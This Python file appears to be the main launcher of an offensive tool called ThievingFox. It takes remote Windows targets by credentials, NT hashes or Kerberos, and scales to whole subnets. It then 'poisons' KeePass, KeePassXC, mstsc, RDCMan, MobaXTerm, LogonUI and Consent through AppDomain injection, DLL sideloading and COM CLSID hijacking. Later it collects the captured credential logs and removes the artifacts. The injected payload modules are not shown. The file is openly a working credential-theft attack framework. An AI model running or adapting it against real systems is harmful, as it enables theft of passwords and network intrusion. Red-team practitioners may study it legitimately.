from crypto import Crypto
from keepass import KeePassFox
from keepassxc import KeePassXCFox
from rdcman import RDCManFox
from mobaxterm import MobaXTermFox
from mstsc import MstscFox
from logonui import LogonUIFox
from consent import ConsentFox

from os import path, makedirs
from impacket.examples.utils import parse_target
from nacl.public import PrivateKey
from ipaddress import IPv4Network

import argparse


# From : https://stackoverflow.com/questions/12151306/argparse-way-to-include-default-values-in-help
class ArgumentParserWithDefaults(argparse.ArgumentParser):
    def add_argument(self, *args, help=None, default=None, **kwargs):
        if help is not None:
            kwargs["help"] = help
        if default is not None and args[0] != "-h":
            kwargs["default"] = default
            if help is not None:
                kwargs["help"] += " (Default: {})".format(default)
        super().add_argument(*args, **kwargs)


if __name__ == "__main__":
    parent_parser = ArgumentParserWithDefaults(
        add_help=False, formatter_class=argparse.RawTextHelpFormatter
    )

    parent_parser.add_argument("-hashes", "--hashes", help="LM:NT hash")

    parent_parser.add_argument(
        "-aesKey", "--aesKey", help="AES key to use for Kerberos Authentication"
    )

    parent_parser.add_argument(
        "-k",
        action="store_true",
        help="Use kerberos authentication. For LogonUI, mstsc and consent modules, an anonymous NTLM authentication is performed, to retrieve the OS version.",
    )

    parent_parser.add_argument(
        "-dc-ip", "--dc-ip", help="IP Address of the domain controller"
    )

    parent_parser.add_argument(
        "-no-pass", "--no-pass", action="store_true", help="Do not prompt for password"
    )

    parent_parser.add_argument(
        "--tempdir",
        default="ThievingFox",
        help="The name of the temporary directory to use for DLLs and output",
    )

    parser = ArgumentParserWithDefaults(parents=[parent_parser])

    subparser = parser.add_subparsers(dest="action")

    collect_subparser = subparser.add_parser("collect", parents=[parent_parser])
    collect_subparser.add_argument(
        "--keepass", help="Collect KeePass.exe logs", action="store_true"
    )
    collect_subparser.add_argument(
        "--keepassxc", help="Collect KeePassXC.exe logs", action="store_true"
    )
    collect_subparser.add_argument(
        "--mstsc", help="Collect mstsc.exe logs", action="store_true"
    )
    collect_subparser.add_argument(
        "--consent", help="Collect Consent.exe logs", action="store_true"
    )
    collect_subparser.add_argument(
        "--logonui", help="Collect LogonUI.exe logs", action="store_true"
    )
    collect_subparser.add_argument(
        "--rdcman", help="Collect RDCMan.exe logs", action="store_true"
    )
    collect_subparser.add_argument(
        "--mobaxterm", help="Collect MobaXTerm.exe logs", action="store_true"
    )
    collect_subparser.add_argument(
        "--all", help="Collect logs from all applications", action="store_true"
    )
    collect_subparser.add_argument(
        "target",
        help="Target machine or range [domain/]username[:password]@<IP or FQDN>[/CIDR]",
    )

    cleanup_subparser = subparser.add_parser("cleanup", parents=[parent_parser])
    cleanup_subparser.add_argument(
        "--keepass",
        help="Try to cleanup all poisonning artifacts related to KeePass.exe",
        action="store_true",
    )
    cleanup_subparser.add_argument(
        "--keepass-share", help="The share on which KeePass is installed", default="c$"
    )
    cleanup_subparser.add_argument(
        "--keepass-path",
        help="The path where KeePass is installed, without the share name",
        default="/Program Files/KeePass Password Safe 2/",
    )
    cleanup_subparser.add_argument(
        "--keepassxc",
        help="Try to cleanup all poisonning artifacts related to KeePassXC.exe",
        action="store_true",
    )
    cleanup_subparser.add_argument(
        "--keepassxc-path",
        help="The path where KeePassXC is installed, without the share name",
        default="/Program Files/KeePassXC/",
    )
    cleanup_subparser.add_argument(
        "--keepassxc-share",
        help="The share on which KeePassXC is installed",
        default="c$",
    )
    cleanup_subparser.add_argument(
        "--mstsc",
        help="Try to cleanup all poisonning artifacts related to mstsc.exe",
        action="store_true",
    )
    cleanup_subparser.add_argument(
        "--consent",
        help="Try to cleanup all poisonning artifacts related to Consent.exe",
        action="store_true",
    )
    cleanup_subparser.add_argument(
        "--logonui",
        help="Try to cleanup all poisonning artifacts related to LogonUI.exe",
        action="store_true",
    )
    cleanup_subparser.add_argument(
        "--rdcman",
        help="Try to cleanup all poisonning artifacts related to RDCMan.exe",
        action="store_true",
    )
    cleanup_subparser.add_argument(
        "--mobaxterm",
        help="Try to cleanup all poisonning artifacts related to MobaXTerm.exe",
        action="store_true",
    )
    cleanup_subparser.add_argument(
        "--all",
        help="Try to cleanup all poisonning artifacts related to all applications",
        action="store_true",
    )
    cleanup_subparser.add_argument(
        "target",
        help="Target machine or range [domain/]username[:password]@<IP or FQDN>[/CIDR]",
    )

    poison_subparser = subparser.add_parser("poison", parents=[parent_parser])
    poison_subparser.add_argument(
        "--keepass",
        help="Try to poison KeePass.exe",
        action="store_true",
    )
    poison_subparser.add_argument(
        "--keepass-path",
        help="The path where KeePass is installed, without the share name",
        default="/Program Files/KeePass Password Safe 2/",
    )
    poison_subparser.add_argument(
        "--keepass-share", help="The share on which KeePass is installed", default="c$"
    )

    poison_subparser.add_argument(
        "--keepassxc",
        help="Try to poison KeePassXC.exe",
        action="store_true",
    )
    poison_subparser.add_argument(
        "--keepassxc-path",
        help="The path where KeePassXC is installed, without the share name",
        default="/Program Files/KeePassXC/",
    )
    poison_subparser.add_argument(
        "--keepassxc-share",
        help="The share on which KeePassXC is installed",
        default="c$",
    )

    poison_subparser.add_argument(
        "--mstsc",
        help="Try to poison mstsc.exe",
        action="store_true",
    )
    poison_subparser.add_argument(
        "--mstsc-poison-hkcr",
        help="Instead of poisonning all currently logged in users' HKCU hives, poison the HKCR hive for mstsc, which will also work for user that are currently not logged in",
        action="store_true",
        default=False,
    )
    poison_subparser.add_argument(
        "--consent",
        help="Try to poison Consent.exe",
        action="store_true",
    )
    poison_subparser.add_argument(
        "--logonui",
        help="Try to poison LogonUI.exe",
        action="store_true",
    )
    poison_subparser.add_argument(
        "--rdcman",
        help="Try to poison RDCMan.exe",
        action="store_true",
    )
    poison_subparser.add_argument(
        "--rdcman-poison-hkcr",
        help="Instead of poisonning all currently logged in users' HKCU hives, poison the HKCR hive for RDCMan, which will also work for user that are currently not logged in",
        action="store_true",
        default=False,
    )
    poison_subparser.add_argument(
        "--mobaxterm",
        help="Try to poison MobaXTerm.exe",
        action="store_true",
    )
    poison_subparser.add_argument(
        "--mobaxterm-poison-hkcr",
        help="Instead of poisonning all currently logged in users' HKCU hives, poison the HKCR hive for MobaXTerm, which will also work for user that are currently not logged in",
        action="store_true",
        default=False,
    )
    poison_subparser.add_argument(
        "--all",
        help="Try to poison all applications",
        action="store_true",
    )

    poison_subparser.add_argument(
        "target",
        help="Target machine or range [domain/]username[:password]@<IP or FQDN>[/CIDR]",
    )

    args, _ = parser.parse_known_args()

    if not path.exists(path.join(path.dirname(__file__), "cache")):
        makedirs(path.join(path.dirname(__file__), "cache"))

    if not path.exists(path.join(path.dirname(__file__), "output")):
        makedirs(path.join(path.dirname(__file__), "output"))

    if not path.exists(
        path.join(path.dirname(__file__), "..", "public.key")
    ) or not path.exists(path.join(path.dirname(__file__), "..", "private.key")):
        # We don't have a keypair yet, let's generate it
        pk = PrivateKey.generate()

        with open(path.join(path.dirname(__file__), "..", "public.key"), "wb") as f:
            f.write(pk.public_key.encode())

        with open(path.join(path.dirname(__file__), "..", "private.key"), "wb") as f:
            f.write(pk.encode())

    domain, username, password, target = parse_target(args.target)

    if args.hashes and not password:
        lm_hash, nt_hash = args.hashes.split(":")
    else:
        nt_hash = ""
        lm_hash = ""

    if args.aesKey is None:
        aesKey = ""
    else:
        aesKey = args.aesKey
        args.k = True

    if (
        password == ""
        and username != ""
        and nt_hash == ""
        and lm_hash == ""
        and aesKey == ""
        and not args.no_pass
    ):
        from getpass import getpass

        password = getpass("Password:")

    temp_dir = args.tempdir

    if all(
        i in [".", "/", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
        for i in target
    ):
        targets = IPv4Network(target, strict=False)
    else:
        targets = [target]

    if not hasattr(args, "mstsc_poison_hkcr"):
        mstsc_poison_hkcr = False
    else:
        mstsc_poison_hkcr = args.mstsc_poison_hkcr

    if not hasattr(args, "mobaxterm_poison_hkcr"):
        mobaxterm_poison_hkcr = False
    else:
        mobaxterm_poison_hkcr = args.mobaxterm_poison_hkcr

    if not hasattr(args, "rdcman_poison_hkcr"):
        rdcman_poison_hkcr = False
    else:
        rdcman_poison_hkcr = args.rdcman_poison_hkcr

    if not hasattr(args, "keepass_share"):
        keepass_share = ""
    else:
        keepass_share = args.keepass_share

    if not hasattr(args, "keepass_path"):
        keepass_path = ""
    else:
        keepass_path = args.keepass_path

    if not hasattr(args, "keepassxc_share"):
        keepassxc_share = ""
    else:
        keepassxc_share = args.keepassxc_share

    if not hasattr(args, "keepassxc_path"):
        keepassxc_path = ""
    else:
        keepassxc_path = args.keepassxc_path

    kpfox = KeePassFox(
        domain,
        username,
        password,
        lm_hash,
        nt_hash,
        aesKey,
        args.k,
        args.dc_ip,
        temp_dir,
        keepass_share,
        keepass_path,
    )
    kpxcfox = KeePassXCFox(
        domain,
        username,
        password,
        lm_hash,
        nt_hash,
        aesKey,
        args.k,
        args.dc_ip,
        temp_dir,
        keepassxc_share,
        keepassxc_path,
    )
    mstscfox = MstscFox(
        domain,
        username,
        password,
        lm_hash,
        nt_hash,
        aesKey,
        args.k,
        args.dc_ip,
        temp_dir,
        poisonHkcrInstead=mstsc_poison_hkcr,
    )
    rdcmanfox = RDCManFox(
        domain,
        username,
        password,
        lm_hash,
        nt_hash,
        aesKey,
        args.k,
        args.dc_ip,
        temp_dir,
        poisonHkcrInstead=rdcman_poison_hkcr,
    )
    mobaxtermfox = MobaXTermFox(
        domain,
        username,
        password,
        lm_hash,
        nt_hash,
        aesKey,
        args.k,
        args.dc_ip,
        temp_dir,
        poisonHkcrInstead=mobaxterm_poison_hkcr,
    )
    logonuifox = LogonUIFox(
        domain,
        username,
        password,
        lm_hash,
        nt_hash,
        aesKey,
        args.k,
        args.dc_ip,
        temp_dir,
    )
    consentfox = ConsentFox(
        domain,
        username,
        password,
        lm_hash,
        nt_hash,
        aesKey,
        args.k,
        args.dc_ip,
        temp_dir,
    )

    for i in targets:
        target = str(i)
        if args.action == "cleanup":
            if args.keepass or args.all:
                kpfox.cleanup(target)

            if args.keepassxc or args.all:
                kpxcfox.cleanup(target)

            if args.mstsc or args.all:
                mstscfox.cleanup(target)

            if args.rdcman or args.all:
                rdcmanfox.cleanup(target)

            if args.mobaxterm or args.all:
                mobaxtermfox.cleanup(target)

            if args.logonui or args.all:
                logonuifox.cleanup(target)

            if args.consent or args.all:
                consentfox.cleanup(target)

        elif args.action == "collect":
            box = Crypto()

            if args.keepass or args.all:
                kpfox.collect(target, box)

            if args.keepassxc or args.all:
                kpxcfox.collect(target, box)

            if args.mstsc or args.all:
                mstscfox.collect(target, box)

            if args.rdcman or args.all:
                rdcmanfox.collect(target, box)

            if args.mobaxterm or args.all:
                mobaxtermfox.collect(target, box)

            if args.logonui or args.all:
                logonuifox.collect(target, box)

            if args.consent or args.all:
                consentfox.collect(target, box)

        elif args.action == "poison":
            if args.keepass or args.all:
                kpfox.AppDomainInjection(target)

            if args.keepassxc or args.all:
                kpxcfox.dropSideloadingDll(target)

            if args.mstsc or args.all:
                mstscfox.doCLSIDPoisonning(target)

            if args.rdcman or args.all:
                rdcmanfox.doCLSIDPoisonning(target)

            if args.mobaxterm or args.all:
                mobaxtermfox.doCLSIDPoisonning(target)

            if args.logonui or args.all:
                logonuifox.doCLSIDPoisonning(target)

            if args.consent or args.all:
                consentfox.doCLSIDPoisonning(target)
